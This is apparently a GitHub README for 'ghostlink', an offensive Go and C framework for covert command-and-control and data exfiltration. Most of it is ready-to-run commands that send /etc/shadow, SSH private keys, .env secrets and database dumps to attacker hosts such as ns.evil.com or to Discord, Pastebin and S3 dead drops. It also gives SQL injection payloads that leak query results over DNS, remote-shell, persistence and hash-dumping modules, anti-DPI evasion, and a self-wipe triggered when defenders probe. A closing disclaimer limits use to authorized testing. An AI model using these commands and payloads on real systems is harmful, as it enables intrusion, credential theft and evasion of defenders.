<div align="center">

# 👻 `ghostlink`
### Next-Generation Multi-Channel OOB Data Exfiltration & Covert C2 Framework

[![Go](https://img.shields.io/badge/Go-1.21+-00ADD8?style=for-the-badge&logo=go&logoColor=white)](https://go.dev)
[![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](LICENSE)
[![Channels](https://img.shields.io/badge/Covert_Channels-9_Engines-00FF66?style=for-the-badge)]()
[![Crypto](https://img.shields.io/badge/Crypto-ECDHE_P--256_%7C_AES--256--GCM-red?style=for-the-badge)]()
[![FEC](https://img.shields.io/badge/Reliability-XOR_FEC_Parity-orange?style=for-the-badge)]()
[![MITRE ATT&CK](https://img.shields.io/badge/MITRE_ATT%26CK-Mapped-blueviolet?style=for-the-badge)](https://attack.mitre.org/)

<p align="center">
  <b>Surgical, low-observable out-of-band data exfiltration and resilient command & control when all standard egress routes are blocked.</b><br>
  <sub>9 Covert Channels · Forward Error Correction (FEC) · Zero-Infra Dead Drops · SQLi OOB Automation · Adaptive Entropy Selection · Anti-DPI Jitter</sub>
</p>

<p align="center">
  <a href="#-the-threat-model-why-traditional-tools-fail"><b>[ Threat Model ]</b></a> &nbsp;•&nbsp;
  <a href="#-the-9-covert-channels"><b>[ Covert Channels ]</b></a> &nbsp;•&nbsp;
  <a href="#-architecture--pipeline"><b>[ Architecture ]</b></a> &nbsp;•&nbsp;
  <a href="#-mitre-attck-matrix"><b>[ MITRE ATT&CK ]</b></a> &nbsp;•&nbsp;
  <a href="#-quick-start"><b>[ Quick Start ]</b></a> &nbsp;•&nbsp;
  <a href="#-exfiltration-arsenal"><b>[ Exfiltration ]</b></a> &nbsp;•&nbsp;
  <a href="#-covert-c2--interactive-operations"><b>[ Covert C2 ]</b></a> &nbsp;•&nbsp;
  <a href="#-sqli-oob-engine--sqlmap-bridge"><b>[ SQLi Bridge ]</b></a> &nbsp;•&nbsp;
  <a href="#-comparison"><b>[ Comparison ]</b></a>
</p>

</div>

---

## ⚡ The Threat Model: Why Traditional Tools Fail

Enterprise network environments have evolved. Next-Generation Firewalls (NGFW), Deep Packet Inspection (DPI), TLS Interception Proxies, JA3/JA4 fingerprinting, and strict egress ACLs make traditional Command & Control (C2) and data exfiltration high-risk operations.

Conventional frameworks (Cobalt Strike, Sliver, Metasploit) excel at post-exploitation in standard networks, but their traffic profiles—persistent HTTPS streams, distinctive TLS handshakes, or high-frequency DNS bursts—trigger immediate heuristics in modern NDR/EDR solutions.

**Ghostlink is engineered for the worst-case scenario: when every standard egress path is blocked or monitored.**

```
┌────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   HARDENED EGRESS ENVIRONMENT                                          │
│                                                                                                        │
│   Target Host                 Corporate Perimeter                   Ghostlink C2 / Collector           │
│   ───────────                 ───────────────────                   ────────────────────────           │
│        │                               │                                       │                       │
│        │ 1. Direct TCP/UDP egress      │                                       │                       │
│        │ ────────────────────────────> ╳ [BLOCKED BY NGFW]                     │                       │
│        │                               │                                       │                       │
│        │ 2. TLS Inspection Proxy       │                                       │                       │
│        │ ────────────────────────────> ╳ [INTERCEPTED / BLOCKED]               │                       │
│        │                               │                                       │                       │
│        │ 3. Ghostlink Multi-Path FEC   │                                       │                       │
│        │    (DNS / DoH / TCP-ISN /     │                                       │                       │
│        │     ICMP / Timing Stego)      │                                       │                       │
│        │ ─────────────────────────────>│ 4. Recursive Internal Resolvers      │                       │
│        │                               │    & Legitimate CDN Gateways          │                       │
│        │                               │ ─────────────────────────────────────>│ 5. Full Reassembly    │
│        │                               │                                       │    & SHA-256 Proof    │
└────────────────────────────────────────────────────────────────────────────────────────────────────────┘
```

- **Surgical Evasion:** Transports payloads over physical and protocol layer anomalies (DNS TXT records, DNS-over-HTTPS RFC 8484, HTTP Cookie/User-Agent smuggling, WebSocket tunnels, ICMP Echo bodies, TCP Initial Sequence Numbers, IPv4 ID fields, packet timing deltas, and packet size modulations).
- **Forward Error Correction (FEC):** Packet drops over lossy UDP/covert side-channels do not corrupt data. Built-in XOR parity shards enable mathematical reconstruction even under severe channel loss.
- **Zero-Infrastructure Dead Drops:** Exfiltrate critical files directly to third-party trusted providers (Discord, AWS S3, Pastebin, Webhooks) without provisioning or exposing a single C2 listener.
- **Cryptographic Forward Secrecy:** Every interactive session generates ephemeral ECDHE P-256 keys followed by AES-256-GCM authenticated encryption with unique nonces per message.

---

## 📡 The 9 Covert Channels

Ghostlink implements nine specialized covert transmission channels designed to match any egress restriction:

| # | Channel | Flag | Layer | Stealth | Throughput | Primary Evasion Target |
|:---:|:---|:---|:---:|:---:|:---:|:---|
| **1** | **DNS** | `-channel dns` | L7 (UDP/53) | `0.85` | Medium | Egress firewalls allowing only internal corporate DNS resolvers |
| **2** | **DoH** | `-channel doh` | L7 (HTTPS/443) | `0.96` | High | Environments inspecting port 53; blends into RFC 8484 DNS over HTTPS |
| **3** | **HTTP** | `-channel http` | L7 (TCP/80, 443)| `0.90` | High | Corporate web proxies; smuggles data via Cookie / User-Agent headers |
| **4** | **WebSocket**| `-channel websocket`| L7 (TCP/WS) | `0.92` | High | Environments allowing long-lived interactive browser sessions |
| **5** | **ICMP** | `-channel icmp` | L3 (Echo Req) | `0.75` | High | Networks filtering TCP/UDP while allowing diagnostic ping probes |
| **6** | **TCP ISN** | `-channel tcp_isn` | L4 (SYN Packets)| `0.70` | Low (~2B/SYN) | Deep packet inspection analyzing packet payloads (no payload carried) |
| **7** | **IP ID** | `-channel ip_id` | L3 (IPv4 Hdr) | `0.72` | Low (~2B/pkt) | Gateways stripping L4 payloads but forwarding IPv4 packets |
| **8** | **Timing** | `-channel timing` | Side-Channel | `0.95` | ~40 bps | Air-gapped / heavily audited perimeters; encodes bits in delay deltas |
| **9** | **Packet Size**| `-channel packet_size`| Side-Channel| `0.80` | ~300 bps | Networks monitoring packet contents; encodes bits in byte length variations |

---

## 🏗️ Architecture & Pipeline

Ghostlink treats data transmission as a fault-tolerant cryptographic pipeline:

```
                  SENDER                                              RECEIVER
      ┌─────────────────────────────┐                     ┌─────────────────────────────┐
      │     Plaintext / Files       │                     │    Verified Output Data     │
      └──────────────┬──────────────┘                     └──────────────^──────────────┘
                     │                                                   │
      ┌──────────────v──────────────┐                     ┌──────────────┴──────────────┐
      │   ECDHE / AES-256-GCM       │                     │     AES-256-GCM Decrypt     │
      │   Authenticated Encryption  │                     │     Integrity Verification  │
      └──────────────┬──────────────┘                     └──────────────^──────────────┘
                     │                                                   │
      ┌──────────────v──────────────┐                     ┌──────────────┴──────────────┐
      │       zlib Compression      │                     │      zlib Decompress        │
      └──────────────┬──────────────┘                     └──────────────^──────────────┘
                     │                                                   │
      ┌──────────────v──────────────┐                     ┌──────────────┴──────────────┐
      │      FEC XOR Sharding       │                     │       FEC Reconstruction    │
      │   (Data + Parity Shards)    │                     │   (Tolerates Missing Shards)│
      └──────────────┬──────────────┘                     └──────────────^──────────────┘
                     │                                                   │
      ┌──────────────v──────────────┐                     ┌──────────────┴──────────────┐
      │    Frame Sequence & CRC32   │                     │     Frame Reassembly        │
      └──────────────┬──────────────┘                     └──────────────^──────────────┘
                     │                                                   │
      ┌──────────────v───────────────────────────────────────────────────┴──────────────┐
      │                        ADAPTIVE CHANNEL ROUTER & SELECTOR                       │
      │              Entropy Scoring · Dynamic Multi-Path · Channel Rotation            │
      └──────┬─────┬─────┬─────┬─────┬─────┬────────┬────────┬─────────────────────────┘
             │     │     │     │     │     │        │        │
             v     v     v     v     v     v        v        v
           [DNS] [DoH] [HTTP] [WS] [ICMP] [ISN] [IP ID] [Timing / Size]
```

---

## 🎯 MITRE ATT&CK Matrix

Ghostlink maps across critical tactics and techniques defined in the MITRE ATT&CK enterprise knowledge base:

| Tactic | Technique | ID | Ghostlink Capability |
|:---|:---|:---:|:---|
| **Command & Control** | Protocol Tunneling | [T1572](https://attack.mitre.org/techniques/T1572/) | DNS, DoH, ICMP, and WebSocket bidirectional tunnels |
| **Command & Control** | Encrypted Channel | [T1573.001](https://attack.mitre.org/techniques/T1573/001/) | Ephemeral ECDHE P-256 key exchange with AES-256-GCM |
| **Command & Control** | Fallback Channels | [T1008](https://attack.mitre.org/techniques/T1008/) | Dynamic multi-channel hopping (`-hop`) and adaptive failover |
| **Command & Control** | Web Protocols | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | RFC 8484 DoH query encapsulation and HTTP header smuggling |
| **Command & Control** | Application Layer Protocol: DNS | [T1071.004](https://attack.mitre.org/techniques/T1071/004/) | Authoritative DNS hierarchy forwarding via recursive resolvers |
| **Exfiltration** | Exfiltration Over C2 Channel | [T1041](https://attack.mitre.org/techniques/T1041/) | Chunked, compressed, and encrypted file streaming |
| **Exfiltration** | Exfiltration Over Alternative Protocol | [T1048](https://attack.mitre.org/techniques/T1048/) | Non-standard protocol modulation (ICMP, TCP ISN, IPv4 ID) |
| **Exfiltration** | Exfiltration Over Web Service | [T1567.002](https://attack.mitre.org/techniques/T1567/002/) | Serverless dead drop exfiltration (Discord, S3, Pastebin) |
| **Defense Evasion** | Steganography | [T1027.003](https://attack.mitre.org/techniques/T1027/003/) | TCP SYN Sequence Numbers and packet delay timing stego |
| **Defense Evasion** | Domain Fronting | [T1090.004](https://attack.mitre.org/techniques/T1090/004/) | CDN SNI camouflage (`-front ajax.googleapis.com`) |
| **Defense Evasion** | Traffic Signaling | [T1205](https://attack.mitre.org/techniques/T1205/) | Canary tripwire alerting and automated channel self-silencing |
| **Collection** | Automated Data Collection | [T1119](https://attack.mitre.org/techniques/T1119/) | Glob search with regex content filtering (`-exfil-glob`) |

---

## 🚀 Quick Start

### 1. Installation & Compilation

```bash
# Clone the repository
git clone https://github.com/jankesec/ghostlink.git && cd ghostlink

# Build the C2 Server, Operator Client, and SQLMap Bridge
go build -ldflags="-s -w" -o ghostlink-server ./cmd/server
go build -ldflags="-s -w" -o ghostlink-client ./cmd/client
go build -ldflags="-s -w" -o ghostlink-bridge ./bridge

# (Optional) Compile the ultra-lightweight C Implant (~30KB, zero dependencies)
gcc -Os -s -o ghostimpl implant/ghostimpl.c
# Cross-compile C implant for Windows targets:
# x86_64-w64-mingw32-gcc -Os -s -o ghostimpl.exe implant/ghostimpl.c -lws2_32
```

### 2. Verify Built-in Test Suite

```bash
go test -v ./...
```

---

## 📦 Exfiltration Arsenal

Ghostlink provides dedicated exfiltration workflows optimized for speed, stealth, and zero footprint.

### 1. Fire-and-Forget Single File Exfiltration
Send target files and terminate immediately. Leaves no active listener, no background process, and zero lingering sockets:

```bash
# Start C2 listener on DNS
./ghostlink-server -channel dns -addr 0.0.0.0:5353 -key "OperatorPresharedKey"

# On the target host: exfiltrate /etc/shadow over DNS
./ghostlink-client -channel dns -addr 10.0.0.5:5353 -key "OperatorPresharedKey" -exfil /etc/shadow

# Server verifies SHA-256 integrity upon arrival:
# [exfil] received shadow (1024 bytes) -> ./exfiltrated/shadow_1 [sha256:a1b2c3d4...]
```

### 2. Recursive Glob Hunting with Regex Content Filtering
Scan filesystem trees, select files under a maximum size threshold, and extract only lines containing specific patterns (e.g. credentials, tokens, connection strings):

```bash
# Exfiltrate environment files containing credentials over DoH via Cloudflare:
./ghostlink-client -channel doh \
  -addr "ns.evil.com@https://cloudflare-dns.com/dns-query" \
  -ecdhe \
  -exfil-glob "/var/www/**/*.env" \
  -exfil-filter "API_KEY|SECRET|AWS_ACCESS|DATABASE_URL" \
  -exfil-max 1048576
```

### 3. Multi-Path Striping with Forward Error Correction (FEC)
Stripe data across multiple simultaneous channels. If defensive mechanisms sever one or more connections mid-transmission, the XOR parity blocks reconstruct the file seamlessly:

```bash
# Split file across DNS, HTTP, ICMP, and WebSocket with parity redundancy:
./ghostlink-client -multi-path dns,http,icmp,websocket \
  -addr C2_HOST:5353 \
  -key "OperatorPresharedKey" \
  -multi-path-fec \
  -exfil internal_database.sql
```

> [!TIP]
> **FEC Shard Mechanics:** Automatically scales parity shards based on payload volume (e.g. 4 data + 2 parity for small buffers; 12 data + 4 parity for larger payloads). Up to 33% packet loss is absorbed without retransmission.

### 4. Zero-Infrastructure Dead Drops (No C2 Server Required)
Exfiltrate directly to trusted third-party cloud infrastructure. All egress traffic appears as legitimate API requests to well-known domains:

```bash
# Discord Webhook Dead Drop
./ghostlink-client -dead-drop discord \
  -dead-drop-url "https://discord.com/api/webhooks/123456789/abcdef..." \
  -exfil /etc/passwd

# Generic HTTPS Webhook
./ghostlink-client -dead-drop webhook \
  -dead-drop-url "https://collector.internal-audit.io/hook" \
  -exfil-glob "/home/*/.ssh/id_*"

# Encrypted Pastebin Post
./ghostlink-client -dead-drop pastebin \
  -dead-drop-url "https://pastebin.com/api/api_post.php" \
  -dead-drop-key "YOUR_PASTEBIN_API_KEY" \
  -exfil /tmp/kerberos_tickets.ccache

# Amazon AWS S3 Bucket Storage
./ghostlink-client -dead-drop s3 \
  -dead-drop-bucket "corp-compliance-logs" \
  -dead-drop-region "us-east-1" \
  -dead-drop-key "AKIAIOSFODNN7EXAMPLE:wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" \
  -exfil /var/log/audit.log
```

---

## 💉 SQLi OOB Engine & SQLMap Bridge

Ghostlink bridges the gap between web application vulnerabilities and covert infrastructure:

### 1. Built-in SQL Injection Payload Generator
Generate DNS and HTTP out-of-band payloads on the fly for MySQL, Microsoft SQL Server, Oracle, and PostgreSQL directly inside the C2 console:

```text
c2> sqli mysql ns.evil.com "SELECT user,password FROM mysql.user LIMIT 1"

=== MySQL DNS OOB Payloads === (domain: ns.evil.com)

# Method 1: LOAD_FILE (Windows UNC query)
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT user,password FROM mysql.user LIMIT 1), '.ns.evil.com\\a'));

# Method 2: INTO OUTFILE UNC path
SELECT * FROM mysql.user INTO OUTFILE CONCAT('\\\\', (SELECT @@version), '.ns.evil.com\\a');

# Method 3: Information Schema Table Enumeration
SELECT LOAD_FILE(CONCAT('\\\\', (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()), '.ns.evil.com\\a'));
```

### 2. Standalone SQLMap Bridge (`ghostlink-bridge`)
Capture SQL injection data exfiltrated via SQLMap without configuring external DNS daemons:

```bash
# Bind the Ghostlink DNS bridge on port 53:
sudo ./ghostlink-bridge -addr 0.0.0.0:53 -output ./sqli_harvested.txt

# Run SQLMap with DNS exfiltration enabled:
sqlmap -u "https://vulnerable.target/item?id=1" --dns-domain="ns.evil.com" --dbs
```

---

## 🕹️ Covert C2 & Interactive Operations

When interactive control is required, Ghostlink provides a rich, resilient multi-session console.

### 1. Authoritative DNS Hierarchy Tunneling
Traverse segmented corporate environments where hosts can only resolve external names through internal forwarding resolvers:

```bash
# Server (Authoritative Nameserver for ns.attacker.com)
sudo ./ghostlink-server -domain ns.attacker.com -addr 0.0.0.0:53 -ecdhe

# Implant on internal host (relies entirely on corporate DHCP DNS)
./ghostlink-client -domain ns.attacker.com -ecdhe -shell
```

### 2. Dynamic SOCKS5 Proxy & Port Forwarding
Pivot through the covert tunnel into internal subnets:

```bash
# Start SOCKS5 proxy listener on the operator host via WebSocket tunnel:
./ghostlink-server -channel websocket -addr 0.0.0.0:8443 -ecdhe
./ghostlink-client -channel websocket -addr 10.0.0.5:8443 -ecdhe -socks 1080

# Route operator tools through the covert channel:
curl --socks5 127.0.0.1:1080 http://192.168.1.50/admin
proxychains-ng nmap -sT -Pn -p 22,80,445 192.168.1.0/24
```

### 3. Anti-DPI Traffic Normalization & Jitter Profiles
Shape packet intervals, burst rates, and delays to mirror benign enterprise traffic:

```bash
# Office hours emulation (sporadic bursts, extended idle periods)
./ghostlink-client -channel http -addr C2_IP:80 -ecdhe -jitter office

# Ultra low-and-slow profile for long-term persistence
./ghostlink-client -channel doh -addr C2_IP:443 -ecdhe -jitter low_slow -reconnect -retries 50
```

Available Jitter Profiles:
- `office`: Mimics 9-to-5 knowledge worker browsing patterns.
- `low_slow`: Extended multi-minute randomized delays to evade SIEM correlation rules.
- `burst`: Rapid batch transfers followed by dormant periods.
- `night`: Off-hours background synchronization schedule.
- `random`: Uniform randomized distribution.

### 4. Canary Tripwire & Self-Destruct / Silence
Continuous channel health monitoring detect defensive inspection or DNS blackholing:

```bash
./ghostlink-client -channel dns -addr C2_IP:5353 -key "Key" -canary -exfil /etc/shadow

# Canary States:
# [canary] OK       -> Operational
# [canary] DEGRADE  -> Packet degradation detected, switching to alternate channel
# [canary] SILENT   -> Probing detected, entering 24h hibernation
# [canary] DEAD     -> Hostile response detected, wiping memory footprint
```

### 5. Multi-Session Interactive Console

```text
  ________    __                  __  ___      __
 / ____/ /_  / /_  ___  _____/ /_/   /____  / /
/ / __/ __ \/ __ \/ _ \/ ___/ __/ / / / __ \/ / 
/ /_/ / / / / /_/ /  __/ /__/ /_/ / / / /_/ / /  
\____/_/ /_/_.___/\___/\___/\__/_/_/_/ .___/_/   
   Covert C2 Console v1.0.1         /_/          

[*] Channel: dns | Listen: 0.0.0.0:16353 | Crypto: ECDHE-P256 | Proto: v2
[+] Session #1 established from 192.168.10.45:51284 (Hostname: PROD-DB01)

c2> sessions
  ID   Remote Address           Channel   Status
  ──   ──────────────           ───────   ──────
  #1   192.168.10.45:51284      dns       Active (Current)
  #2   10.200.4.12:49312        doh       Active

c2> run sysinfo
[*] Hostname     : PROD-DB01
[*] OS / Arch    : linux/amd64 (Ubuntu 22.04 LTS)
[*] User / UID   : root (0)
[*] Interfaces   : eth0: 192.168.10.45, docker0: 172.17.0.1

c2> run portscan 192.168.10.0/24 22,80,443,3306,5432,6379
c2> run persist cron /tmp/implant
c2> download /var/backups/db.sql
c2> shell
```

---

## 🧩 Built-in Post-Exploitation Modules

Ghostlink includes 8 in-memory post-exploitation modules requiring zero external tooling:

| Module | Description | Example Invocation |
|:---|:---|:---|
| `sysinfo` | OS, kernel, architecture, current user, network interfaces, uptime | `run sysinfo` |
| `portscan` | In-memory TCP SYN / Connect scanner for internal subnet reconnaissance | `run portscan 10.0.0.0/24 22,80,443,8080` |
| `ps` | Process enumeration with PID, PPID, user context, and commandline args | `run ps` |
| `netstat` | Active TCP/UDP listening ports and established sockets | `run netstat` |
| `env` | Environment variables, secret tokens, and cloud metadata pointers | `run env` |
| `screenshot` | Multi-platform screen capture (X11 / Wayland / Win32 / macOS CoreGraphics) | `run screenshot` |
| `persist` | Persistence installer (Cron jobs, systemd units, Windows Registry Run keys)| `run persist cron /path/to/bin` |
| `hashdump` | Extracts local password hashes and credential material (root/SYSTEM required)| `run hashdump` |

---

## 🔬 Native REST API & Wireshark Dissector

### 1. Automation REST API (`-api`)
Automate red team engagements or integrate with external orchestration engines:

```bash
# Launch C2 with headless management API enabled:
./ghostlink-server -channel dns -addr 0.0.0.0:16353 -api 127.0.0.1:8888
```

| Method | Endpoint | Description |
|:---:|:---|:---|
| `GET` | `/api/sessions` | List active sessions, remote IP, and transport channels |
| `GET` | `/api/sessions/{id}` | Retrieve session status and metadata |
| `POST` | `/api/sessions/{id}/exec` | Execute command on remote agent (`{"command": "id"}`) |
| `POST` | `/api/sessions/{id}/module` | Execute module (`{"module": "sysinfo", "args": []}`) |
| `DELETE`| `/api/sessions/{id}` | Gracefully terminate target session |
| `GET` | `/api/modules` | List all available post-exploitation modules |

### 2. Wireshark Protocol Dissector (`tools/ghostlink.lua`)
Debug and analyze Ghostlink protocol frames in Wireshark:

```bash
# Copy dissector to local Wireshark plugins directory:
mkdir -p ~/.local/lib/wireshark/plugins/
cp tools/ghostlink.lua ~/.local/lib/wireshark/plugins/

# In Wireshark: Analyze -> Decode As -> Select Port -> GHOSTLINK
```

---

## 🪶 Ultra-Lightweight C Implant (`ghostimpl`)

For embedded Linux devices, constrained IoT targets, or legacy environments where the Go runtime cannot be deployed, Ghostlink includes `implant/ghostimpl.c`:

- **Binary Size:** ~30KB statically compiled.
- **Dependencies:** Zero external libraries (`libc` only; `ws2_32.lib` on Windows).
- **Transports:** DNS query tunneling + HTTP cookie smuggling.
- **Compilation:**
  ```bash
  # Linux:
  gcc -Os -s -o ghostimpl implant/ghostimpl.c

  # Windows cross-compilation:
  x86_64-w64-mingw32-gcc -Os -s -o ghostimpl.exe implant/ghostimpl.c -lws2_32
  ```

---

## ⚔️ Comparison

| Capability | **Ghostlink** | Cobalt Strike | Sliver | dnscat2 | Cloak | Chisel |
|:---|:---:|:---:|:---:|:---:|:---:|:---:|
| **Primary Focus** | **Covert OOB Exfil + C2** | Full Enterprise C2 | Open-Source C2 | DNS Tunnel | Covert C2 | TCP/UDP Tunnel |
| **Covert Channels** | **9 Engines** | 2 (HTTP/DNS) | 3 (HTTP/DNS/WG) | 1 (DNS) | 1 (DNS) | 1 (HTTP/WS) |
| **DNS-over-HTTPS (DoH)** | **Native (RFC 8484)** | Third-party malleable | Custom | No | No | No |
| **Steganography (ISN / IP-ID)** | **Yes** | No | No | No | No | No |
| **Side-Channels (Timing / Size)** | **Yes** | No | No | No | No | No |
| **Forward Error Correction** | **Yes (XOR Parity)** | No | No | No | No | No |
| **Multi-Path Striping** | **Yes** | No | No | No | No | No |
| **Serverless Dead Drops** | **Yes (Discord/S3/Pastebin)** | No | No | No | No | No |
| **SQLi OOB Generator & Bridge** | **Yes (MySQL/MSSQL/PG/Oracle)** | No | No | No | No | No |
| **SOCKS5 Dynamic Proxying** | **Yes** | Yes | Yes | No | No | Yes |
| **Tripwire / Canary Hibernation**| **Yes** | No | No | No | No | No |
| **Lightweight C Implant** | **Yes (~30KB)** | Artifact Kit | No | Yes | No | No |
| **Wireshark Dissector** | **Included (`.lua`)** | Third-party | No | Third-party | No | No |

---

## 📐 Wire Protocol v2 Specification

Ghostlink v2 implements an 8-byte binary framing layer designed for low overhead and stream multiplexing:

```text
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|    Version    |  Message Type |          Stream ID            |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|       Stream ID (cont.)       |         Payload Length        |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|                         Payload Bytes                         |
|                             ...                               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### OpCode Definitions

```text
Shell Subsystem : Stdin (0x01) · Stdout (0x02) · Stderr (0x03)
Command Exec    : Req (0x04) · Res (0x05)
File Transfer   : Put (0x06) · GetReq (0x07) · GetChunk (0x08)
Port Forwarding : Connect (0x10) · Data (0x11) · Close (0x12)
SOCKS5 Tunnel   : Connect (0x13) · Data (0x14) · Close (0x15)
Liveness Heart  : Ping (0x20) · Pong (0x21)
Session Control : Reconnect (0x30) · SessionID (0x31)
Post-Exploit    : List (0x40) · Exec (0x41) · Result (0x42)
Exfiltration    : File (0x50) · Glob (0x51) · Ack (0x52) · Chunk (0x53)
Dead Drop       : Send (0x54) · Ack (0x55)
Tripwire / State: Alert (0x60) · Check (0x61)
Exception       : Error (0xFF)
```

---

## 🔐 Cryptographic Identity & Author

Ghostlink is researched and developed for authorized red team simulation, defensive gap analysis, and network forensics verification.

```text
Author          : Sevban Dönmez (@jankesec)
Role            : Senior Cyber Security Consultant · Red Team & Offensive Security Researcher
Research Portal : https://jankesec.com
GitHub          : https://github.com/jankesec
PGP Fingerprint : FF0A 7D83 6751 CCE3 F9CC F574 FCF8 39FB 7F00 4626
GPG Key ID      : 5FDB257F4AAE8C3F
```

---

## ⚠️ Disclaimer

This tool is designed and released **strictly for authorized penetration testing, adversary emulation, and security research**. Unauthorized testing on networks, hosts, or systems without prior written authorization is illegal. The author assumes no liability for misuse, damages, or regulatory violations resulting from this software.

## 📜 License

Distributed under the **MIT License**. See [`LICENSE`](LICENSE) for complete terms.

<p align="center">
  <a href="https://www.buymeacoffee.com/sevbandonmez">
    <img src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-sevbandonmez-FFDD00?style=for-the-badge&logo=buymeacoffee&logoColor=black" alt="Buy Me A Coffee">
  </a>
</p>
